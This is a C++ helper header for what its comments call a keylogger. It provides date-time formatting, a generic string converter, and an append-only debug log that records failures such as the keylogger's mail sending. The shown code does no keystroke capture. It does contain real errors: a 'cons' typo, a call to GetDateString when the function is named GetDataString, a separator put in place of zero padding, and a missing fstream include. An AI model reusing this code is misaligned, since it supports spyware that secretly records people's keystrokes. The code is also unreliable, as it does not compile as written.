#ifndef HELPER_H
#define HELPER_H

#include<ctime>
#include<string>
#include<sstream>       //used to convert data to strings

//creating our own namespace
namespace Helper
{
    template <typename T>

    std::string convertToString(const T &);

    //this function prototype ensures that this function can take parameters of many data types
    // i.e. the data type of argument to the function can be int, char,float etc. and it will be converted to string
    //what this will do is create functions which will have same body but will have different data type that it accomodates in its arguments

    struct DateTime        //takes date and time of machine on which the keylogger is runnning
        {
        DateTime(){
            time_t ms;      //ms= milliseconds and it represents time(time_t)
            time (&ms);     //takes the system time and places into variable i.e. ms here

            struct tm*info = localtime(&ms);

            D = info->tm_mday;      //day
            m = info->tm_mon + 1;   //month
            y = 1900 + info->tm_year;   //year
            M = info->tm_min;
            H = info->tm_hour;
            S = info->tm_sec;
        }

        DateTime(int D,int m,int y,int H,int M,int S) : D(D) , m(m) , y(y), H(H), M(M), S(S) {}
        DateTime(int D,int m,int y): D(D) , m(m), y(y) ,H(0),M(0),S(0) {}

        DateTime Now() const //reads from class and doesn't change anything
        {
            return DateTime();
        }
    int D,m,y,H,M,S;

    //to display date in DD.MM.YYYY
    std::string GetDataString() const
    {
        return std::string (D<10 ? "0" : "") + convertToString(D) +
               std::string (m<10? ".0" : ".") + convertToString(m) + "." +
               convertToString(y);
    }

    //to display time in HH:MM:SS
    std::string GetTimeString(const std::string &sep = ";" )const
    {

        return std::string(H<10?"0":"") + convertToString(H) + sep +
               std::string(M<10?"0":"") + convertToString(M) + sep +
               std::string(S<10?sep:"") + convertToString(S) ;

    }

    std::string GetDateTimeString (cons std::string &sep = ":") const
    {
        return GetDateString() + " " + GetTimeString(sep);
    }

  };

template <class T>

std::string convertToString(const T &e)
{
    //we will only be able to pass that parameter through this function which supports insertion operator "<<"
    //if we pass some e of type t which doesn't support << , we will get compilation error
     std::ostringstream s;
     s<<e;
     return s.str();

}

//creating a log file which will not record key strokes
//it will be used for debugging(it will record the errors.)
//for example if the mail fails it will record it probably with the reason of failing
    void WriteAppLog(const std::string &s)
    {
        std::ofstream file("AppLog.txt", std::ios::app); //ios- in/out stream  app - append i.e. it will modify/change in file
        file<< "[" << Helper::DateTime().GetDateTimeString() << "]"
        <<"\n"<<s <<std::endl<<"\n";
        file.close();
    }


}





#endif // HELPER_H
